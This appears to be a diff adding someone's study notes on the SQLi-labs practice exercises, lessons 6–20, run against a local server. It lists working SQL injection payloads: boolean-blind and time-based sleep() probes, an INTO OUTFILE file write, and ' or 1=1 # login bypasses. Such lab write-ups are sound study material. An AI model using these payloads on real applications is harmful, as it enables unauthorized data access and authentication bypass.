@@ -1,0 +1,86 @@
+lesson 6
+
+http://localhost/Less-6/?id=" or length((select database()))=8 --+
+
+same as 5 but with double quotes
+
+
+lesson 7 
+
+http://localhost/Less-7/?id=')) or 1=1 --+
+
+double parentheses with single quotes , but blind and wants us to use outfile to dump data
+
+?id=')) union select 1,2,"boom hacked man" into outfile "/tmp/l33t.txt" --+
+
+lesson 8
+
+?id=' or substring((select database()),1,1)='s' --+
+
+single quotes , blind , boolean (almost like 5 ) 
+
+
+lesson 9
+
+blind time based 
+
+1' and (select sleep(1) from dual where database() like 'securit{c}')  --+
+
+see lesson9.py
+
+lesson 10
+
+same as above but double quotes
+
+?id=1 " and sleep(4) and length(database())=8 --+
+
+lesson 11
+
+the classic authentication bypass
+
+' or 1=1 # 
+
+lesson 12
+
+parentheses and double quotes
+
+") or 1=1 #
+
+lesson 13
+
+') or length(database())=8 #
+
+single quotes parentheses
+
+lesson 14 
+
+" or 1=1 #
+
+double quotes only
+
+lesson 15
+
+see lesson15.py
+
+
+lesson 16
+
+") or 1=1 #
+
+lesson 17
+
+see lesson17.py
+
+lesson 18
+
+see lesson18.py
+
+lesson 19
+
+see lesson19.py
+
+lesson 20
+
+see lesson20.py
+
+
